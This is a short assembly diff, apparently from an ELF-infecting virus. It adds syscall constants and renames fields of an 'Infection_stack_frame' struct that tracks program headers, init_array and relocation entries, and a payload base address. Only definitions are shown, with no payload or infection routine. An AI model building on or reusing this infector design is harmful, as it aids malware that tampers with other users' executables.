@@ -8,6 +8,7 @@
 %define SYS_LSEEK       0x08
 %define SYS_MMAP        0x09
 %define SYS_MUNMAP      0x0b
+%define SYS_MREMAP      0x19
 %define SYS_MSYNC       0x1a
 %define SYS_EXIT        0x3c
 %define SYS_CHDIR       0x50
@@ -29,6 +30,7 @@
 %define MAP_PRIVATE     0x02
 %define MAP_SHARED      0x01
 %define MAP_ANONYMOUS   0x20
+%define MAP_MAYMOVE     1
 
 %define MS_SYNC         0x04
 
@@ -116,17 +118,16 @@ struc       Infection_stack_frame ; Not really a structure but it will help to c
     e_hdr:                  resb    ELFHDR_SIZE
     file_size:              resq    1
     map:                    resq    1
-    text_phdr:              resq    1
-    data_phdr:              resq    1
-    old_entrypoint:         resq    1
+    text_phdr_off:          resq    1
+    data_phdr_off:          resq    1
     old_text_size:          resq    1
-    last_text_shdr:         resq    1
-    init_array_shdr:        resq    1
-    bss_shdr:               resq    1
+    last_text_shdr_off:     resq    1
+    init_array_shdr_off:    resq    1
+    bss_shdr_off:           resq    1
     old_init_func:          resq    1
     payload_base_address:   resq    1
     payload_base_offset:    resq    1
-    init_rela_entry:        resq    1
+    init_rela_entry_off:    resq    1
 endstruc
 
 %define STACK_FRAME_SIZE    0xc0
